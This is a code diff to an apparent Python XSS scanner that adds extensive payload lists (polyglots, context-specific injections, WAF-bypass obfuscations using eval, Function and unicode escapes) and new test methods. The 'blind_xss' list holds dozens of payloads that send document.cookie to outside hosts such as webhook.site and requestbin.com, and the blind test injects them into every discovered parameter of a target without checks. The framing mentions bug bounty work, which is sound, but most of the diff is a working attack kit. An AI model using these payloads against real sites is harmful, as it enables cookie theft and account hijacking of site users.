@@ -45,7 +45,176 @@ class XSSPayloads:
                 '<video><source onerror="alert(\'XSS\')">',
                 '<audio src=x onerror=alert("XSS")>',
             ],
+            'advanced_polyglot': [
+                'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
+                '"><svg/onload=alert()//',
+                '"><img src=x onerror=alert()>',
+                '"><iframe src=javascript:alert()></iframe>',
+                '"><script>alert()</script>',
+                '"><body onload=alert()>',
+                '"><input onfocus=alert() autofocus>',
+                '"><select onfocus=alert() autofocus>',
+                '"><textarea onfocus=alert() autofocus>',
+                '"><video><source onerror=alert()>',
+                '"><audio src=x onerror=alert()>',
+                '"><details open ontoggle=alert()>',
+                '"><marquee onstart=alert()>',
+                '"><object data=javascript:alert()>',
+                '"><embed src=javascript:alert()>',
+                '"><applet code=javascript:alert()>',
+                '"><link rel=stylesheet href=javascript:alert()>',
+                '"><style>@import javascript:alert()</style>',
+                '"><style>body{background:url(javascript:alert())}</style>',
+                '"><style>@keyframes x{from{background:url(javascript:alert())}}</style>'
+            ],
             
+            'context_aware': [
+                # HTML Context
+                '"><script>alert("XSS")</script>',
+                '"><img src=x onerror=alert("XSS")>',
+                '"><svg onload=alert("XSS")>',
+                '"><iframe src=javascript:alert("XSS")></iframe>',
+                '"><body onload=alert("XSS")>',
+                '"><input onfocus=alert("XSS") autofocus>',
+                '"><select onfocus=alert("XSS") autofocus>',
+                '"><textarea onfocus=alert("XSS") autofocus>',
+                '"><video><source onerror=alert("XSS")>',
+                '"><audio src=x onerror=alert("XSS")>',
+                # Attribute Context
+                '" onmouseover=alert("XSS") "',
+                '" onfocus=alert("XSS") autofocus="',
+                '" onblur=alert("XSS") "',
+                '" onkeydown=alert("XSS") "',
+                '" onkeyup=alert("XSS") "',
+                '" onchange=alert("XSS") "',
+                '" oninput=alert("XSS") "',
+                '" onreset=alert("XSS") "',
+                '" onsubmit=alert("XSS") "',
+                '" oninvalid=alert("XSS") "',
+                # CSS Context
+                ';color:red;background:url(javascript:alert("XSS"));',
+                ';color:red;background:expression(alert("XSS"));',
+                ';color:red;background:url(data:text/html,<script>alert("XSS")</script>);',
+                ';color:red;@import url(javascript:alert("XSS"));',
+                ';color:red;@keyframes x{from{background:url(javascript:alert("XSS"))}};',
+                # JavaScript Context
+                ';alert("XSS");//',
+                ';alert(String.fromCharCode(88,83,83));//',
+                ';alert(/XSS/.source);//',
+                ';alert(1+1);//',
+                ';alert(document.domain);//',
+                ';alert(location.href);//',
+                ';alert(document.cookie);//',
+                ';alert(document.title);//',
+                ';alert(window.name);//',
+                ';alert(navigator.userAgent);//',
+                # URL Context
+                'javascript:alert("XSS")',
+                'javascript:void(alert("XSS"))',
+                'javascript:alert(String.fromCharCode(88,83,83))',
+                'javascript:alert(/XSS/.source)',
+                'javascript:alert(1+1)',
+                'javascript:alert(document.domain)',
+                'javascript:alert(location.href)',
+                'javascript:alert(document.cookie)',
+                'javascript:alert(document.title)',
+                'javascript:alert(window.name)',
+                'javascript:alert(navigator.userAgent)',
+                # Data URI Context
+                'data:text/html,<script>alert("XSS")</script>',
+                'data:text/html,<img src=x onerror=alert("XSS")>',
+                'data:text/html,<svg onload=alert("XSS")>',
+                'data:text/html,<iframe src=javascript:alert("XSS")></iframe>',
+                'data:text/html,<body onload=alert("XSS")>',
+                'data:text/html,<input onfocus=alert("XSS") autofocus>',
+                'data:text/html,<select onfocus=alert("XSS") autofocus>',
+                'data:text/html,<textarea onfocus=alert("XSS") autofocus>',
+                'data:text/html,<video><source onerror=alert("XSS")>',
+                'data:text/html,<audio src=x onerror=alert("XSS")>'
+            ],
+            'advanced_event_handlers': [
+                # Mouse Events
+                'onclick=alert("XSS")',
+                'onmousedown=alert("XSS")',
+                'onmouseup=alert("XSS")',
+                'onmouseover=alert("XSS")',
+                'onmouseout=alert("XSS")',
+                'onmousemove=alert("XSS")',
+                'onmouseenter=alert("XSS")',
+                'onmouseleave=alert("XSS")',
+                'oncontextmenu=alert("XSS")',
+                'onauxclick=alert("XSS")',
+                # Keyboard Events
+                'onkeydown=alert("XSS")',
+                'onkeyup=alert("XSS")',
+                'onkeypress=alert("XSS")',
+                # Form Events
+                'onchange=alert("XSS")',
+                'oninput=alert("XSS")',
+                'onblur=alert("XSS")',
+                'onfocus=alert("XSS")',
+                'onreset=alert("XSS")',
+                'onsubmit=alert("XSS")',
+                'oninvalid=alert("XSS")',
+                'onformchange=alert("XSS")',
+                'onforminput=alert("XSS")',
+                # Window Events
+                'onload=alert("XSS")',
+                'onunload=alert("XSS")',
+                'onbeforeunload=alert("XSS")',
+                'onresize=alert("XSS")',
+                'onscroll=alert("XSS")',
+                'onhashchange=alert("XSS")',
+                'onpopstate=alert("XSS")',
+                'onstorage=alert("XSS")',
+                'onmessage=alert("XSS")',
+                'onerror=alert("XSS")',
+                'onabort=alert("XSS")',
+                # Media Events
+                'oncanplay=alert("XSS")',
+                'oncanplaythrough=alert("XSS")',
+                'ondurationchange=alert("XSS")',
+                'onemptied=alert("XSS")',
+                'onended=alert("XSS")',
+                'onloadstart=alert("XSS")',
+                'onpause=alert("XSS")',
+                'onplay=alert("XSS")',
+                'onplaying=alert("XSS")',
+                'onprogress=alert("XSS")',
+                'onratechange=alert("XSS")',
+                'onseeked=alert("XSS")',
+                'onseeking=alert("XSS")',
+                'onstalled=alert("XSS")',
+                'onsuspend=alert("XSS")',
+                'ontimeupdate=alert("XSS")',
+                'onvolumechange=alert("XSS")',
+                'onwaiting=alert("XSS")',
+                # Print Events
+                'onbeforeprint=alert("XSS")',
+                'onafterprint=alert("XSS")',
+                # Page Events
+                'onpagehide=alert("XSS")',
+                'onpageshow=alert("XSS")',
+                # Network Events
+                'ononline=alert("XSS")',
+                'onoffline=alert("XSS")',
+                # Device Events
+                'onorientationchange=alert("XSS")',
+                # Drag Events
+                'ondrag=alert("XSS")',
+                'ondragend=alert("XSS")',
+                'ondragenter=alert("XSS")',
+                'ondragleave=alert("XSS")',
+                'ondragover=alert("XSS")',
+                'ondragstart=alert("XSS")',
+                'ondrop=alert("XSS")',
+                # Clipboard Events
+                'oncopy=alert("XSS")',
+                'oncut=alert("XSS")',
+                'onpaste=alert("XSS")',
+                # Wheel Events
+                'onwheel=alert("XSS")'
+            ],
             'waf_bypass': [
                 '<ScRiPt>alert("XSS")</ScRiPt>',
                 '<script>al\u0065rt("XSS")</script>',
@@ -55,9 +224,129 @@ class XSSPayloads:
                 '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                 '<script>alert`XSS`</script>',
                 '<script>alert(/XSS/)</script>',
+                # Advanced WAF Bypass Techniques
+                '<script>window["alert"]("XSS")</script>',
+                '<script>self["alert"]("XSS")</script>',
+                '<script>top["alert"]("XSS")</script>',
+                '<script>parent["alert"]("XSS")</script>',
+                '<script>frames["alert"]("XSS")</script>',
+                '<script>globalThis["alert"]("XSS")</script>',
+                '<script>this["alert"]("XSS")</script>',
+                '<script>window.alert("XSS")</script>',
+                '<script>self.alert("XSS")</script>',
+                '<script>top.alert("XSS")</script>',
+                '<script>parent.alert("XSS")</script>',
+                '<script>frames.alert("XSS")</script>',
+                '<script>globalThis.alert("XSS")</script>',
+                '<script>this.alert("XSS")</script>',
+                # Unicode and Encoding Bypass
+                '<script>al\u0065rt("XSS")</script>',
+                '<script>al\u0065\u0072t("XSS")</script>',
+                '<script>al\u0065\u0072\u0074("XSS")</script>',
+                '<script>al\u0065\u0072\u0074(String.fromCharCode(88,83,83))</script>',
+                '<script>al\u0065\u0072\u0074(/XSS/.source)</script>',
+                '<script>al\u0065\u0072\u0074(1+1)</script>',
+                '<script>al\u0065\u0072\u0074(document.domain)</script>',
+                '<script>al\u0065\u0072\u0074(location.href)</script>',
+                '<script>al\u0065\u0072\u0074(document.cookie)</script>',
+                '<script>al\u0065\u0072\u0074(document.title)</script>',
+                # Template Literal Bypass
+                '<script>alert`XSS`</script>',
+                '<script>alert`${1+1}`</script>',
+                '<script>alert`${document.domain}`</script>',
+                '<script>alert`${location.href}`</script>',
+                '<script>alert`${document.cookie}`</script>',
+                '<script>alert`${document.title}`</script>',
+                # Function Constructor Bypass
+                '<script>Function("alert(\"XSS\")")()</script>',
+                '<script>Function("al"+"ert(\"XSS\")")()</script>',
+                '<script>Function("al"+"ert(\""+"XSS"+"\")")()</script>',
+                '<script>Function("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")")()</script>',
+                '<script>Function("al"+"ert(\""+/XSS/.source+"\")")()</script>',
+                # Eval Bypass
+                '<script>eval("alert(\"XSS\")")</script>',
+                '<script>eval("al"+"ert(\"XSS\")")</script>',
+                '<script>eval("al"+"ert(\""+"XSS"+"\")")</script>',
+                '<script>eval("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")")</script>',
+                '<script>eval("al"+"ert(\""+/XSS/.source+"\")")</script>',
+                # SetTimeout Bypass
+                '<script>setTimeout("alert(\"XSS\")",0)</script>',
+                '<script>setTimeout("al"+"ert(\"XSS\")",0)</script>',
+                '<script>setTimeout("al"+"ert(\""+"XSS"+"\")",0)</script>',
+                '<script>setTimeout("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")",0)</script>',
+                '<script>setTimeout("al"+"ert(\""+/XSS/.source+"\")",0)</script>',
+                # SetInterval Bypass
+                '<script>setInterval("alert(\"XSS\")",1000)</script>',
+                '<script>setInterval("al"+"ert(\"XSS\")",1000)</script>',
+                '<script>setInterval("al"+"ert(\""+"XSS"+"\")",1000)</script>',
+                '<script>setInterval("al"+"ert(\""+String.fromCharCode(88,83,83)+"\")",1000)</script>',
+                '<script>setInterval("al"+"ert(\""+/XSS/.source+"\")",1000)</script>',
+                # Array Bypass
+                '<script>["alert"]("XSS")</script>',
+                '<script>["al"+"ert"]("XSS")</script>',
+                '<script>["al"+"ert"]("X"+"S"+"S")</script>',
+                '<script>["al"+"ert"](String.fromCharCode(88,83,83))</script>',
+                '<script>["al"+"ert"](/XSS/.source)</script>',
+                # Object Bypass
+                '<script>({alert:alert})["alert"]("XSS")</script>',
+                '<script>({alert:alert})["al"+"ert"]("XSS")</script>',
+                '<script>({alert:alert})["al"+"ert"]("X"+"S"+"S")</script>',
+                '<script>({alert:alert})["al"+"ert"](String.fromCharCode(88,83,83))</script>',
+                '<script>({alert:alert})["al"+"ert"](/XSS/.source)</script>',
+                # Proxy Bypass
+                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["alert"]("XSS")</script>',
+                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"]("XSS")</script>',
+                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"]("X"+"S"+"S")</script>',
+                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"](String.fromCharCode(88,83,83))</script>',
+                '<script>new Proxy({},{get:(t,p)=>p==="alert"?alert:undefined})["al"+"ert"](/XSS/.source)</script>',
                 '<script>alert(1)</script>',
                 '<script>confirm(1)</script>',
                 '<script>prompt(1)</script>',
+            ],
+            'blind_xss': [
+                # Blind XSS Payloads for Bug Bounty
+                '<script>fetch("https://webhook.site/unique-id?data="+document.cookie)</script>',
+                '<script>fetch("https://requestbin.com/unique-id?data="+document.cookie)</script>',
+                '<script>fetch("https://httpbin.org/get?data="+document.cookie)</script>',
+                '<script>fetch("https://postman-echo.com/get?data="+document.cookie)</script>',
+                '<script>fetch("https://httpstat.us/200?data="+document.cookie)</script>',
+                '<script>fetch("https://httpbin.org/post",{method:"POST",body:document.cookie})</script>',
+                '<script>fetch("https://webhook.site/unique-id",{method:"POST",body:document.cookie})</script>',
+                '<script>fetch("https://requestbin.com/unique-id",{method:"POST",body:document.cookie})</script>',
+                '<script>fetch("https://postman-echo.com/post",{method:"POST",body:document.cookie})</script>',
+                '<script>fetch("https://httpstat.us/200",{method:"POST",body:document.cookie})</script>',
+                # Advanced Blind XSS
+                '<script>new Image().src="https://webhook.site/unique-id?data="+document.cookie</script>',
+                '<script>new Image().src="https://requestbin.com/unique-id?data="+document.cookie</script>',
+                '<script>new Image().src="https://httpbin.org/get?data="+document.cookie</script>',
+                '<script>new Image().src="https://postman-echo.com/get?data="+document.cookie</script>',
+                '<script>new Image().src="https://httpstat.us/200?data="+document.cookie</script>',
+                '<script>XMLHttpRequest().open("GET","https://webhook.site/unique-id?data="+document.cookie)</script>',
+                '<script>XMLHttpRequest().open("GET","https://requestbin.com/unique-id?data="+document.cookie)</script>',
+                '<script>XMLHttpRequest().open("GET","https://httpbin.org/get?data="+document.cookie)</script>',
+                '<script>XMLHttpRequest().open("GET","https://postman-echo.com/get?data="+document.cookie)</script>',
+                '<script>XMLHttpRequest().open("GET","https://httpstat.us/200?data="+document.cookie)</script>',
+                # Polyglot Blind XSS
+                'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch("https://webhook.site/unique-id?data="+document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch("https://webhook.site/unique-id?data="+document.cookie)//>',
+                '"><script>fetch("https://webhook.site/unique-id?data="+document.cookie)</script>',
+                '"><img src=x onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><svg onload=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><iframe src=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)></iframe>',
+                '"><body onload=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><input onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
+                '"><select onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
+                '"><textarea onfocus=fetch("https://webhook.site/unique-id?data="+document.cookie) autofocus>',
+                '"><video><source onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><audio src=x onerror=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><details open ontoggle=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><marquee onstart=fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><object data=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><embed src=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><applet code=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><link rel=stylesheet href=javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)>',
+                '"><style>@import javascript:fetch("https://webhook.site/unique-id?data="+document.cookie)</style>',
+                '"><style>body{background:url(javascript:fetch("https://webhook.site/unique-id?data="+document.cookie))}</style>',
+                '"><style>@keyframes x{from{background:url(javascript:fetch("https://webhook.site/unique-id?data="+document.cookie))}}</style>'
             ],
             
             'context_specific': {
@@ -386,24 +675,30 @@ class XSSScanner:
         return recon_results
 
     def test_reflected_xss(self, recon_data: Dict) -> List[Dict]:
-        """Test for Reflected XSS vulnerabilities"""
-        print("\n🔍 Testing Reflected XSS...")
+        """Test for Reflected XSS vulnerabilities with advanced payloads"""
+        print("\n🔍 Testing Reflected XSS with Advanced Payloads...")
         results = []
-        total_tests = len(recon_data['discovered_params']) * len(self.payloads.payloads['basic'])
+        
+        # Get all payload categories
+        all_payloads = []
+        for category, payloads in self.payloads.payloads.items():
+            if isinstance(payloads, list):
+                all_payloads.extend(payloads)
+        
+        total_tests = len(recon_data['discovered_params']) * len(all_payloads)
         current_test = 0
         
         for param in recon_data['discovered_params']:
             print(f"\n📝 Testing parameter: {param}")
+            
+            # Test basic payloads first
             for payload in self.payloads.payloads['basic']:
                 current_test += 1
-                print(f"  [{current_test}/{total_tests}] Testing payload: {payload[:50]}...")
+                print(f"  [{current_test}/{total_tests}] Testing basic payload: {payload[:50]}...")
                 
                 try:
                     test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
-                    print(f"  🌐 Request URL: {test_url}")
-                    
                     response = self.recon.session.get(test_url, timeout=10)
-                    print(f"  📊 Response Code: {response.status_code}")
                     
                     if self.detect_xss_in_response(response, payload):
                         result = {
@@ -412,16 +707,52 @@ class XSSScanner:
                             'payload': payload,
                             'url': test_url,
                             'method': 'GET',
-                            'response_code': response.status_code
+                            'response_code': response.status_code,
+                            'category': 'basic'
                         }
                         results.append(result)
                         print(f"  🚨 XSS VULNERABILITY FOUND in parameter: {param}")
                         print(f"  ✅ Payload: {payload}")
+                        continue  # Skip advanced payloads if basic one works
                     else:
                         print(f"  ❌ No XSS detected")
                         
                 except Exception as e:
                     print(f"  ⚠️  Error testing parameter {param}: {e}")
+            
+            # Test advanced payloads if basic ones didn't work
+            if not any(r['parameter'] == param for r in results):
+                print(f"  🔬 Testing advanced payloads for parameter: {param}")
+                
+                for category in ['advanced_polyglot', 'context_aware', 'waf_bypass']:
+                    if category in self.payloads.payloads:
+                        for payload in self.payloads.payloads[category]:
+                            current_test += 1
+                            print(f"  [{current_test}/{total_tests}] Testing {category}: {payload[:50]}...")
+                            
+                            try:
+                                test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
+                                response = self.recon.session.get(test_url, timeout=10)
+                                
+                                if self.detect_xss_in_response(response, payload):
+                                    result = {
+                                        'type': 'Reflected XSS',
+                                        'parameter': param,
+                                        'payload': payload,
+                                        'url': test_url,
+                                        'method': 'GET',
+                                        'response_code': response.status_code,
+                                        'category': category
+                                    }
+                                    results.append(result)
+                                    print(f"  🚨 XSS VULNERABILITY FOUND in parameter: {param}")
+                                    print(f"  ✅ Payload: {payload}")
+                                    break  # Stop testing this parameter
+                                else:
+                                    print(f"  ❌ No XSS detected")
+                                    
+                            except Exception as e:
+                                print(f"  ⚠️  Error testing parameter {param}: {e}")
         
         print(f"\n✅ Reflected XSS testing completed. Found {len(results)} vulnerabilities.")
         return results
@@ -492,6 +823,65 @@ class XSSScanner:
                             print(f"    ⚠️  Error testing form field {input_field['name']}: {e}")
         
         print(f"\n✅ Stored XSS testing completed. Found {len(results)} vulnerabilities.")
+        return results
+
+    def test_blind_xss(self, recon_data: Dict) -> List[Dict]:
+        """Test for Blind XSS vulnerabilities with advanced payloads"""
+        print("\n🔍 Testing Blind XSS with Advanced Payloads...")
+        results = []
+        
+        if 'blind_xss' not in self.payloads.payloads:
+            print("  ⚠️  No Blind XSS payloads available")
+            return results
+        
+        total_tests = len(recon_data['discovered_params']) * len(self.payloads.payloads['blind_xss'])
+        current_test = 0
+        
+        for param in recon_data['discovered_params']:
+            print(f"\n📝 Testing Blind XSS parameter: {param}")
+            
+            for payload in self.payloads.payloads['blind_xss']:
+                current_test += 1
+                print(f"  [{current_test}/{total_tests}] Testing Blind XSS payload: {payload[:50]}...")
+                
+                try:
+                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
+                    print(f"  🌐 Request URL: {test_url}")
+                    
+                    response = self.recon.session.get(test_url, timeout=10)
+                    print(f"  📊 Response Code: {response.status_code}")
+                    
+                    # For Blind XSS, we can't detect execution directly
+                    # We just inject the payload and hope it gets stored/executed elsewhere
+                    result = {
+                        'type': 'Blind XSS',
+                        'parameter': param,
+                        'payload': payload,
+                        'url': test_url,
+                        'method': 'GET',
+                        'response_code': response.status_code,
+                        'note': 'Payload injected - check webhook/logs for execution'
+                    }
+                    results.append(result)
+                    print(f"  📤 Blind XSS payload injected in parameter: {param}")
+                    print(f"  ✅ Payload: {payload}")
+                    
+                except Exception as e:
+                    print(f"  ⚠️  Error testing Blind XSS parameter {param}: {e}")
+        
+        print(f"\n✅ Blind XSS testing completed. Injected {len(results)} payloads.")
+        return results
+
+    def test_dom_xss(self, recon_data: Dict) -> List[Dict]:
+        """Test for DOM XSS vulnerabilities"""
+        print("\n🔍 Testing DOM XSS...")
+        results = []
+        
+        # DOM XSS testing requires browser automation
+        # For now, we'll just return empty results
+        print("  ⚠️  DOM XSS testing requires browser automation (Selenium)")
+        print("  📝 This feature will be implemented in future versions")
+        
         return results
 
     def detect_xss_in_response(self, response: requests.Response, payload: str) -> bool:
@@ -604,16 +994,25 @@ class XSSScanner:
         
         try:
             scan_results['reconnaissance'] = self.run_reconnaissance()
-            scan_results['vulnerabilities'].extend(self.test_reflected_xss(scan_results['reconnaissance']))
-            scan_results['vulnerabilities'].extend(self.test_stored_xss(scan_results['reconnaissance']))
             
+            # Test all XSS types
+            reflected_results = self.test_reflected_xss(scan_results['reconnaissance'])
+            stored_results = self.test_stored_xss(scan_results['reconnaissance'])
+            dom_results = self.test_dom_xss(scan_results['reconnaissance'])
+            blind_results = self.test_blind_xss(scan_results['reconnaissance'])
+            
+            # Add all results
+            scan_results['vulnerabilities'].extend(reflected_results)
+            scan_results['vulnerabilities'].extend(stored_results)
+            scan_results['vulnerabilities'].extend(dom_results)
+            scan_results['vulnerabilities'].extend(blind_results)
+            
+            # Update summary
             scan_results['summary']['total_vulnerabilities'] = len(scan_results['vulnerabilities'])
-            for vuln in scan_results['vulnerabilities']:
-                vuln_type = vuln['type'].lower().replace(' ', '_')
-                if 'reflected' in vuln_type:
-                    scan_results['summary']['reflected_xss'] += 1
-                elif 'stored' in vuln_type:
-                    scan_results['summary']['stored_xss'] += 1
+            scan_results['summary']['reflected_xss'] = len(reflected_results)
+            scan_results['summary']['stored_xss'] = len(stored_results)
+            scan_results['summary']['dom_xss'] = len(dom_results)
+            scan_results['summary']['blind_xss'] = len(blind_results)
             
             logger.info(f"Scan completed. Found {scan_results['summary']['total_vulnerabilities']} vulnerabilities")
             
